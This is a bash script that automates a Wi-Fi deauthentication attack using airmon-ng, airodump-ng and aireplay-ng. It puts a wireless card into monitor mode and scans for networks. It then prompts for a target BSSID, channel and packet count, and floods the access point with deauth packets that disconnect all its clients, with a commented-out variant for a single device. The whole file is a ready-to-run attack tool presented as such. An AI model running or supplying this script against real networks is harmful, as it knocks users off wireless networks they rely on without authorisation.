#!/bin/bash

# List the wireless interfaces 
echo -e "Available wireless interfaces:\n"
iwconfig

echo "Enter the wireless interface you want to use (e.g., wlan0):"
read interface

# Kill conflicting processes
echo -e "\nKilling conflicting processes...\n"
sudo airmon-ng check kill

# Enter monitor mode FIRST
echo -e "Switching to Monitor mode on interface $interface...\n"
sudo airmon-ng start $interface

# New Interface
echo "New Interface :\n"
read interfacemon

# Detect monitor interface 
# interfacemon=$(iw dev | awk '$1=="Interface"{print $2}' | grep -E "${interface}mon")

# Fallback (IMPORTANT for MT7921)
# if [ -z "$interfacemon" ]; then
#     interfacemon=$interface
# fi

# echo -e "Using monitor interface: $interfacemon\n"

# Scan networks
echo -e "Scanning for available wireless networks...\n"
sudo airodump-ng --band abg $interfacemon

echo "Enter the BSSID of the target network:"
read bssid
echo "Enter the channel of the target network:"
read channel

# ✅ FIX: Lock channel BEFORE client scan
sudo iwconfig $interfacemon channel $channel

# List connected devices
# echo -e "Listing connected devices to the target network...\n"
# echo -e "When Scanning completes press (ctrl+c)\n"
# sudo airodump-ng --bssid $bssid --channel $channel $interfacemon

# echo -e "Enter the MAC address of the target device:"
# read target_mac


echo "Enter the number of deauthentication packets to send (e.g., 100):"
read packet_count


# Deauthentication
echo -e "DeAuth Attack has been started !!!\n"
echo -e "To exit/Stop Attack press (ctrl+c) \n"

# For Deauth Specific Device
# sudo aireplay-ng --deauth 10 -a $bssid -c $target_mac $interfacemon 

# To Deauth All Devices
sudo aireplay-ng --deauth $packet_count -a $bssid $interfacemon 

echo -e "Attack Stopped\n"
echo -e "Exiting from the Monitor mode\n"

sudo airmon-ng stop $interfacemon

# ✅ FIX: Restore network
sudo systemctl restart NetworkManager

echo -e "DeAuth Attack Completed\n"